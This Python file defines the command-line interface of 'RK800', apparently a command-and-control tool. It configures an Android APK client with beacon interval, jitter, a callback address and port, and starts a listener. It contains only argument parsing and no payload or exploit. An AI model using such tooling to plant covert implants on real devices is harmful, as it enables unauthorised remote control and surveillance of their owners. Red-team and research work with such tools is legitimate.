#!/usr/bin/env python3

import argparse

try:
    import argcomplete
except ImportError:
    argcomplete = None


def create_parser():
    parser = argparse.ArgumentParser(
        prog="rk800",
        description="RK800 CLI Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    subparsers = parser.add_subparsers(dest="command", help="available commands")

    # configure client
    configure_parser = subparsers.add_parser("config", help="configure client")
    configure_parser.add_argument(
        "-i",
        "--beacon-interval",
        type=int,
        default=120,
        help="beacon interval in minutes, default: 120",
    )
    configure_parser.add_argument(
        "-j",
        "--beacon-jitter",
        type=int,
        default=60,
        help="beacon jitter in minutes, default: 60",
    )
    configure_parser.add_argument(
        "-w",
        "--connection-weight",
        type=int,
        default=0,
        help="commands per connection, default: 0 (no limit)",
    )
    configure_parser.add_argument(
        "-a", "--address", type=str, required=True, help="REQUIRED: callback address"
    )
    configure_parser.add_argument(
        "-p", "--port", type=int, required=True, help="REQUIRED: callback port"
    )
    configure_parser.add_argument(
        "-o", "--output", type=str, default="configured.apk", help="output APK file path, default: configured.apk"
    )

    # listen
    listen_parser = subparsers.add_parser("listen", help="start listening")
    listen_parser.add_argument("listen_addr", help="address to bind to")
    listen_parser.add_argument("listen_port", type=int, help="port to listen on")

    if argcomplete:
        argcomplete.autocomplete(parser)

    return parser


def parse_args(args=None):
    parser = create_parser()
    return parser.parse_args(args)
